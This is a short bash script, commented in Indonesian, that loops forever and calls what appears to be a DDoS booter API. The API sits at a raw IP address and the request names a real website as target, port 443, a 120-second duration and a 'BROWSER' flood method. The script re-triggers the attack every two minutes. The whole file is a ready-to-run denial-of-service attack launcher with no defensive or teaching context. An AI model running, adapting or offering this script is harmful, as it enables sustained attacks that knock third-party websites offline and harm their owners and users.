#!/bin/bash

# Daftar URL API yang akan diakses
api_urls=("http://178.128.210.78/api?key=fengzzt&host=https://cerdig.com&port=443&time=120&method=BROWSER")

while true
do
    for api_url in "${api_urls[@]}"
    do
        response=$(curl -s "$api_url")

        # Proses respons dari API di sini
        if [ $? -eq 0 ]; then
            echo "Data from $api_url: $response"
        else
            echo "Failed to fetch data from $api_url."
        fi
    done

    # Menunggu 2 menit sebelum mengirim kembali permintaan
    sleep 120
done
